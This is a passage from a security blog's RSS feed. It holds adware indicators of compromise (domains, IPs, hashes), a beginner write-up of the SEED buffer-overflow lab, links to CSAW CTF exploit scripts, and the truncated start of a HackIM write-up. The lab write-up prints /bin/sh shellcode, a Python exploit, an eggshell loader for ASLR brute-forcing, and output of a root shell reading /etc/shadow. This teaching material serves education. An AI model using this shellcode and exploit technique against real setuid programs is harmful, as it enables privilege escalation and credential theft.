+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?ssl=1"><img data-attachment-id="704" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c77b2a0e82/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=729%2C461&amp;ssl=1" data-orig-size="729,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c77b2a0e82" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=300%2C190&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=604%2C382&amp;ssl=1" class="alignnone size-full wp-image-704 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=604&#038;ssl=1" alt="" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=729&amp;ssl=1 729w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?resize=300%2C190&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p><strong>IOCs:</strong></p>
+<p><strong>appfastplay.com</strong></p>
+<p>Created</p>
+<table width="416">
+<tbody>
+<tr>
+<td>2017-04-08</td>
+<td>New</td>
+<td>-none-</td>
+<td>198.54.117.212</td>
+</tr>
+<tr>
+<td>2017-04-23</td>
+<td>Change</td>
+<td>198.54.117.212</td>
+<td>198.54.117.215</td>
+</tr>
+<tr>
+<td>2017-07-07</td>
+<td>Change</td>
+<td>198.54.117.215</td>
+<td>198.54.117.210</td>
+</tr>
+</tbody>
+</table>
+<p>Namecheap domain hosting @ USA.</p>
+<p><strong>mughthesec.com</strong></p>
+<p>198.54.117.210</p>
+<p><strong>SimplyEApps.com</strong><br />
+198.54.117.210</p>
+<p><strong>(api./dl./cdn.)dynacubeapps.com</strong></p>
+<p>198.54.117.210</p>
+<p><strong>(api./dl./cdn.)cloudmacfront.com</strong></p>
+<p><strong>(api./dl./cdn.)api.airautoupdates.com</strong></p>
+<p><strong>(api./dl./cdn.)osxessentials.com</strong></p>
+<p><strong>(api./dl./cdn.)api.vertizoom.com</strong></p>
+<p><strong>(api./dl./cdn.)macgabspan.com</strong></p>
+<p><strong>install.searchwebsvc.com</strong></p>
+<p><strong>install.trustedsafefinder.com</strong></p>
+<p><strong>searc.trustedsafefinder.com/h?_pg=XXXX-1234-67890</strong></p>
+<p><strong>searc.trustedsafefinder.com/s?q=@@@&amp;_pg=XXXX-1234-67890</strong></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong>~/Library/LaunchAgents/com.Mughthesec.plist</strong></p>
+<p><strong><span class="mono">~/Library/Application Support/com.Mughthesec</span></strong></p>
+<p><strong>~/Library/LaunchAgents/SearchWebSvc.plist</strong></p>
+<p><strong><span class="mono">~/Library/Application Support/SearchWebSvc</span></strong></p>
+<p><strong>~/Library/LaunchAgents/TrustedSafeFinder</strong></p>
+<p><strong><span class="mono">~/Library/Application Support/com.TrustedSafeFinder.plist</span></strong></p>
+<p>&nbsp;</p>
+<p><strong>~/Library/LaunchAgents/com.pcv.hlpramcn.plist  (Advanced Mac Cleaner)</strong></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><em>phan anh 4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
+<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
+<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
+<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
+<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
+<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
+<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
+<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
+<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
+<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
+<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
+<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
+<p><em>4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
+<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
+<p><em>cf63d5861eb654efcafef25d758ca5daf877e3c63888ee086bcd29f22e3f77ad</em></p>
+<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
+<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
+<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
+<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
+<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
+<p><em>8690299992e9a1d8bf1b5184a3274619eb6c95c44a83b42f7ee455b419947d5d</em></p>
+<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
+<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
+<p><em>f47246e7b4ae43d6aa284145292d67247d428d52f327c00a7f7af2dd65fb1c0b</em></p>
+<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
+<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
+<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
+<p><em>52ac6206d109acb15547e8f655d1e522d28bbb39c9e40784126de5f27778f51c</em></p>
+<p><em>cd9c564799f88ad6efae4bd5acb047d5f0d5b39378965386925c171eec3977b5</em></p>
+<p><em>15d796bd76339a0fbb430bc8c6cc9bcbd6a21f3aef619d0cb81fe0069552a29d</em></p>
+<p><em>99c598ef5fe10347803296d20a37fb6c33d793f35443725dbcfc41382dbd9391</em></p>
+<p><em>34886986af88810585238c2ecf44924e48a08f775b25794e553689f0f2585899</em></p>
+<p><em>12effeff2bc280d144bd1432f9bbfae2efaae483731d20b6f0b061e8be505a0c</em></p>
+<p><em>3460877be00af3632895539567b57647ca1e07363213b4f93d52ac80b17454ee</em></p>
+<p><em>79b54c71b74112881a8c4b88ad36a9bae4c2eecedcba510e2b4f52c215a9ebac</em></p>
+<p>&nbsp;</p>
+<p><em>quoc thinh</em><br />
+<em> 9c4f74feff131fa93dd04175795f334649ee91ad7fce11dc661231254e1ebd84</em></p>
+<p><em>f5d76324cb8fcae7f00b6825e4c110ddfd6b32db452f1eca0f4cff958316869c</em></p>
+<p><em>63b9e81a0c3a57bcbaf2aac308ecc53035f7fff6a416a6752acf13f16352a94a</em></p>
+<p><em>431c30c1db1aefb87d5fa5485c0fd11e792ec94bb95fb401cc93ef0528ad41cb</em></p>
+<p><em>687def9ff3cd0fa8dab1a7d4da5fa04b0604292fa74a66f23a96fb1eb31cd2c2</em></p>
+<p>&nbsp;</p>
+<p><em>pham huong</em></p>
+<p><em>af1e6391dd48f84beac69fbd69dbbb20eefd7ca69d33c686ed4d5a85ba760254</em></p>
+<p><em>7ce4d0ec31dc334388d2461b65617ba5dbdebf935da2ed2a7d65d8a9cc14148c</em></p>
+<p><em>f995bd07e5f782cf823b45d226c63407695d4a1bfb06358f49621291f1629f60</em></p>
+<p><em>a2bd399d8087752776762fa9a805429de6973994f26e17bdac9ca4130dcb87fb</em></p>
+<p><em>bafe800c397e69e9e6859311c437e5c4b6cdd200f3ed832306e6c9f331eb6bae</em></p>
+<p>&nbsp;</p>
+<p><em>nhien nguyen</em></p>
+<p><em>3028aa7ece2f140f6fa28d348bf18156e6e4da4cb2f9208925d15ca7b564f35f</em></p>
+<p><em>fc89afe4f72c3e02dca3e998351e59684f5ad6a9000c9f2eaee3b7195d4f0fda</em></p>
+<p>&nbsp;</p>
+<p><em>minh duc</em></p>
+<p><em>17f39a0268ec97cf5528bcc9d871c7f7b428379a2549c3b01581440acd7ed8a5</em></p>
+<p><em>79e821bab2adbdb9a53e471b7a1937c8f0a1ba1ce0801b8d2eca49a7c9391e42</em></p>
+<p><em>dfc0b3618a3eb246ae6026c460596a102f45ff71660f7fdec39c5f105a3190cd</em></p>
+<p><em>90d825d481297def07771865a5e719c4e55ed1109008721744608bf94841d7cc</em></p>
+<p>&nbsp;</p>
+<p><em>tran phong</em></p>
+<p><em>8c1b1b2b997a11d8b408091e12d02960bf71bb83304a3b23c439056c4e9882ad</em></p>
+<p><em>9acb781d19d6ed4c6ac6e10448d113fca868bba21f95496f535013005fe2d29e</em></p>
+<p><em>f159c3dc2aa704d42a07f145985fa7b339cbd4bcdf7ff9783220b9dd3a9e097e</em></p>
+<p><em>a1dc898586e1697bd19d6c6ec8421e1871ac918132bcbcf89db9b523e199664d</em></p>
+<p><em>e537d868f9ab708e3c5a8427dd4036798570b7d6b55b3ef0e1be9775e64e9c9d</em></p>
+<p><em>f7468d3af9267e9a6325fb981a5bd734dafeea32265d0318cb4793bd1b52f112</em></p>
+<p>&nbsp;</p>
+<p><em>mai linh</em></p>
+<p>&nbsp;</p>
+<p><em>c7c11ae9fdaeef0c359621de06d4de5264cc3d62929d5e8a1e2c3d2c08290e2f</em></p>
+<p><em>202d7e5bd230c59051d5c21124e9af613f70576f3511a0a79c567f48844e5b45</em></p>
+<p>&nbsp;</p>
+<p><em>thanh thuy</em></p>
+<p><em>6494a2bd4e9da2f3000b0774a13682a3f9fcd17e7da8d0fd42bfa88d1dce14f5</em></p>
+<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
+<p><em>f86b4d24627d5dc9d806a3f89c03aea19aaa987bcedb44fc5635140bf9191d03</em></p>
+<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
+<p><em>086ad9c053fc3a670db2954b120733ba97109e1eb845ca383e88d2623289ae66</em></p>
+<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
+<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
+<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
+<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
+<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
+<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
+<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
+<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
+<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
+<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
+<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
+<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
+<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
+<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
+<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
+<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
+<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
+<p id="INlghhy"><em> </em></p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">687</post-id>	</item>
+		<item>
+		<title>Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</title>
+		<link>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/</link>
+				<comments>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/#comments</comments>
+				<pubDate>Sat, 12 Mar 2016 16:02:46 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=486</guid>
+				<description><![CDATA[Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if you are experienced in CTF's pwn then just skip it. Enjoy! Reference: BoF Vulnerability Lab (Syracuse University) Return to Shellcode =================== &#8230; <a href="https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/" class="more-link">Continue reading <span class="screen-reader-text">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if you are experienced in CTF's pwn then just skip it. Enjoy!</p>
+<p><span id="more-486"></span></p>
+<p>Reference: <a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Buffer_Overflow/" target="_blank">BoF Vulnerability Lab (Syracuse University)</a></p>
+<p><strong>Return to Shellcode</strong><br />
+===================</p>
+<p>The program stack.c has 2 functions: main() and bof() which has a buffer overflow vulnerability. Main function reads an input from a file called “badfile”, and then passes this value to function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() has only 24 bytes long. Buffer overflow will occur because strcpy() does not check boundaries. Since this program is super-uid executable, if a normal user can exploit this buffer overflow vulnerability, any user might be able to execute shellcode under root privilege. It should be considered that the program gets its input from a file called ’badfile’, system environment variables and argument variables. They are under our control hence there are many approaches to spawn a root shell.<br />
+Some conditions in the first task are described as following:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under<br />
+root permission.</p>
+<p>- It was built with options: execstack and -fno-stack-protector to<br />
+turn off the non-executable stack and StackGuard protections.</p>
+<p>- ASLR was turned off.</p>
+<p>Inside the function bof(), the buffer variable is defined as an array of 24 chars. It can be easily overflowed with a longer string str which reads from “badfile”. However, the defined variable on stack depends along both operating system and the compiler. Result of GDB will help us to make sure the size of stack certainly:<br />
+(gdb) disas bof<br />
+Dump of assembler code for function bof:</p>
+<pre class="lang:default decode:true ">0x08048484 &lt;+0&gt;: push ebp
+0x08048485 &lt;+1&gt;: mov ebp,esp
+0x08048487 &lt;+3&gt;: sub esp,0x38
+0x0804848a &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
+0x0804848d &lt;+9&gt;: mov DWORD PTR [esp+0x4],eax
+0x08048491 &lt;+13&gt;: lea eax,[ebp-0x20]
+0x08048494 &lt;+16&gt;: mov DWORD PTR [esp],eax
+0x08048497 &lt;+19&gt;: call 0x8048380 &lt;strcpy@plt&gt;
+0x0804849c &lt;+24&gt;: mov eax,0x1
+0x080484a1 &lt;+29&gt;: leave
+0x080484a2 &lt;+30&gt;: ret</pre>
+<p>&nbsp;</p>
+<p>The buffer variable’s size is 32 bytes according to line 13 and also 32 bytes to reach Stack pointer and plus 4 bytes to reach saved Based pointer. In order to spawn a shell, execve /bin/sh shellcode was generated and placed into badfile after some NOPs (\\x90) . The return address is unknown and also it is a difference between GDB environment and the real-time one. It can be revealed by using:</p>
+<p>- Live program tracing (strace/ltrace).</p>
+<p>- Modifying the source code.</p>
+<p>- Brute-forcing the return address.</p>
+<p>- GDB debugging with dumped core (segmentation fault).</p>
+<p>We chose the first solution because the second one is unrealistic, the third and fourth one would take much effort.</p>
+<pre class="lang:default decode:true">seed@ubuntu:~/Desktop$ ltrace ./stack
+__libc_start_main(0x80484a3, 1, 0xbffff434, 0x8048520, 0x8048590 &lt;unfinished ...&gt;
+fopen("badfile", "r") = 0x804b008
+fread(0xbffff187, 1, 517, 0x804b008) = 40
+----snippet----</pre>
+<p>The buffer variable which reads from badfile has address: 0xbffff187. In sum, we construct a payload combined from NOPs, shellcode, ESP (or a random 4bytes), return address 0xbffff187 in little-endian format to an exploitation program called exploit.py which writes the payload to “badfile”:</p>
+<p>&nbsp;</p>
+<pre class="lang:default decode:true ">import struct
+shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+f = open('badfile','w')
+ret = struct.pack('&lt;I', 0xbffff187)
+f.write("\x90"*(0x20-len(shellcode))+shellcode+"DEAD"+ret)</pre>
+<p>&nbsp;</p>
+<p>We launch the attack by running the vulnerable program and spawn a root shell successfully.</p>
+<pre class="lang:default decode:true ">[12/01/2015 15:25] seed@ubuntu:~/Desktop$ python exploit.py
+[12/01/2015 15:25] seed@ubuntu:~/Desktop$ ./stack
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)
+# cat /etc/shadow
+root:$6$012BPz.K$fbPkT6H6Db4/B8cLWbQI1cFjn0R25yqtqrSrFeWfCgybQWWnwR4ks/.rjqyM7Xwh/pDyc5U1BWOzkWh7T9ZGu.:15933:0:99999:7:::</pre>
+<p>&nbsp;</p>
+<p><strong>Address Randomization</strong><br />
+=====================</p>
+<p>There are some conditions in the second task as following:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
+<p>- It was built with options: execstack and -fno-stack-protector to turn off the non-executable stack and StackGuard protections.</p>
+<p>- ASLR was turned on.</p>
+<p>The above exploitation program was not working and resulted “Segmentation fault (core dumped)” because ASLR was turned on that<br />
+assures the program addresses are changed randomly for each execution. There are some techniques to bypass this prevention:</p>
+<p>- Brute-forcing or running the exploitation program many times</p>
+<p>- Return-oriented programming (or using a branch of this technique: ret2libc)</p>
+<p>However the “badfile” input can have a maximum length of only 517 bytes but the observed buffer could be any addresses ranged from 0xbf000000 to 0xbfffffff. It makes the attack difficult to jump into the shellcode exactly even when we fill the whole “str” variable upto 517 bytes with a larger number of NOPs and shellcode placed behind the return address. In order to increase the probability of success, we can utilize an environment variable to hold a larger payload. The following code loads ten thousand bytes of NOPs and shellcode into environment variable EGG.</p>
+<pre class="lang:default decode:true ">/* eggcode.c */
+#include &lt;unistd.h&gt;
+#define NOP 0x90
+char shellcode[] =
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
+int main(void)
+{
+char shell[10000];
+puts("Eggshell loaded into environment.\n");
+memset(shell,NOP,10000); /* fill-up the buffer with NOP */
+/* fill-up the shellcode on the second half to the end of buffer */
+memcpy(&amp;shell[10000-strlen(shellcode)],shellcode,strlen(shellcode));
+/* set the environment variable to */
+/* EGG and shell as its value, rewrite if needed */
+setenv("EGG", shell, 1);
+/* modify the variable */
+putenv(shell);
+/* invoke the bash */
+system("bash");
+return 0;
+}</pre>
+<p>&nbsp;</p>
+<p>We simply executed the program above then attempted ./stack in the following loop and spawn a root shell in just a minute.</p>
+<pre class="lang:default decode:true ">$ sh -c "while [ 1 ]; do ./stack; done;"
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+---snippet---
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)</pre>
+<p>&nbsp;</p>
+<p>Stack Guard<br />
+<strong>===========</strong></p>
+<p>The following options describe the conditions of third task:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
+<p>- It was built without the option -fno-stack-protector to turn on the Stack Guard.</p>
+<p>- ASLR was turned off.</p>
+<p>For this task, we executed the exploitation program again and observed an error message:</p>
+<pre class="lang:default decode:true ">seed@ubuntu:~/Desktop$ ./stack
+*** stack smashing detected ***: ./stack terminated
+Segmentation fault (core dumped)</pre>
+<p>&nbsp;</p>
+<p>The reason of this error is a protection mechanism used by compiler to detect buffer overflow occurs. It adds random protection variables (called canaries or stack cookies) to the stack. We can get some information about the point of overflow insight by running the program in GDB. For instance, the disassembly of bof() function is different from the previous one:</p>
+<pre class="lang:default decode:true ">(gdb) disas bof
+Dump of assembler code for function bof:
+0x080484d4 &lt;+0&gt;: push ebp
+0x080484d5 &lt;+1&gt;: mov ebp,esp
+0x080484d7 &lt;+3&gt;: sub esp,0x48
+0x080484da &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
+0x080484dd &lt;+9&gt;: mov DWORD PTR [ebp-0x2c],eax
+0x080484e0 &lt;+12&gt;: mov eax,gs:0x14
+0x080484e6 &lt;+18&gt;: mov DWORD PTR [ebp-0xc],eax
+0x080484e9 &lt;+21&gt;: xor eax,eax
+0x080484eb &lt;+23&gt;: mov eax,DWORD PTR [ebp-0x2c]
+0x080484ee &lt;+26&gt;: mov DWORD PTR [esp+0x4],eax
+0x080484f2 &lt;+30&gt;: lea eax,[ebp-0x24]
+0x080484f5 &lt;+33&gt;: mov DWORD PTR [esp],eax
+0x080484f8 &lt;+36&gt;: call 0x80483d0 &lt;strcpy@plt&gt;
+0x080484fd &lt;+41&gt;: mov eax,0x1
+0x08048502 &lt;+46&gt;: mov edx,DWORD PTR [ebp-0xc]
+0x08048505 &lt;+49&gt;: xor edx,DWORD PTR gs:0x14
+0x0804850c &lt;+56&gt;: je 0x8048513 &lt;bof+63&gt;
+0x0804850e &lt;+58&gt;: call 0x80483b0 &lt;__stack_chk_fail@plt&gt;
+0x08048513 &lt;+63&gt;: leave
+0x08048514 &lt;+64&gt;: ret
+End of assembler dump.</pre>
+<p>&nbsp;</p>
+<p>The compiler firstly moves a random value to stack at address <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7794f0c456c0855443a03d4c63788683.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and compares these 2 values by using XOR in the end of this<br />
+function. If the value in stack is modified then the program will jump to the function stackchkfail() which notifies an error message “stack smashing detected” eventually. This means if our program overwrites the whole stack and tries to illegally control the stack pointers will make it halted. There are some techniques to bypass the Stack Guard : leak the value of canaries or overwrite the entire stack all the way up to the arguments and environment vectors but the stack cookie check would not working properly. Moreover please take a look at this <a href="https://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf" target="_blank">paper</a>.</p>
+<p>&nbsp;</p>
+<p>-cmxd</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">486</post-id>	</item>
+		<item>
+		<title>CSAW 2015 CTF All Exploitable Solutions (Script only)</title>
+		<link>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/</link>
+				<comments>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/#comments</comments>
+				<pubDate>Mon, 21 Sep 2015 02:45:25 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=359</guid>
+				<description><![CDATA[I'm too lazy to write up in deep these challenges, but i will give you my solution to solve these challenges. You will do it by yourself before you read my exploit script, that makes you understand deeper. I hope you enjoy with this. Happy pwnning. Contacts: https://gist.github.com/peternguyen93/478baa59191e3108d0a3 FTP: https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242 AutoBots: https://gist.github.com/peternguyen93/6a53ee3596ff89233710 Memeshop: https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3 Rhinoxorus: https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0]]></description>
+								<content:encoded><![CDATA[<p>I'm too lazy to write up in deep these challenges, but i will give you my solution to solve these challenges. You will do it by yourself before you read my exploit script, that makes you understand deeper. I hope you enjoy with this. Happy pwnning.</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?ssl=1"><img data-attachment-id="362" data-permalink="https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/attachment/1119/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" data-orig-size="250,235" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1119" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?fit=250%2C235&amp;ssl=1" class="alignnone size-full wp-image-362" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/09/1119.gif?resize=250%2C235&#038;ssl=1" alt="1119" width="250" height="235" data-recalc-dims="1" /></a></p>
+<ul>
+<li>Contacts: <a href="https://gist.github.com/peternguyen93/478baa59191e3108d0a3">https://gist.github.com/peternguyen93/478baa59191e3108d0a3</a></li>
+<li>FTP: <a href="https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242">https://gist.github.com/peternguyen93/23fd065e4ce0afb9f242</a></li>
+<li>AutoBots: <a href="https://gist.github.com/peternguyen93/6a53ee3596ff89233710">https://gist.github.com/peternguyen93/6a53ee3596ff89233710</a></li>
+<li>Memeshop: <a href="https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3">https://gist.github.com/peternguyen93/d9ffaa75eab24efeecc3</a></li>
+<li>Rhinoxorus: <a href="https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0">https://gist.github.com/peternguyen93/a5d79671bbc99ef75cb0</a></li>
+</ul>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/09/21/csaw-2015-ctf-all-exploitable-solutions-script-only/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">359</post-id>	</item>
+		<item>
+		<title>[HackIM 2014] RE + Pwn MentalNote</title>
+		<link>https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/</link>
+				<pubDate>Tue, 13 Jan 2015 01:58:34 +0000</pubDate>
+		<dc:creator><![CDATA[Trí Chim Trích]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[re]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[list-linked]]></category>
+		<category><![CDATA[side-channel]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=259</guid>
+				<description><![CDATA[RE 100 - boo binary khá nặng C:\Users\chim\Desktop\nullcon\re\boo&#62;trid boo TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello Collecting data from file: boo 100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1) =&#62; Mac OS Binary kernel Mach 64 bit Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào C:\Users\chim\Desktop\nullcon\re\boo&#62;upx -d &#8230; <a href="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/" class="more-link">Continue reading <span class="screen-reader-text">[HackIM 2014] RE + Pwn MentalNote</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h2><span style="color: #3366ff;">RE 100 - boo</span></h2>
+<p>binary khá nặng</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;trid boo
+
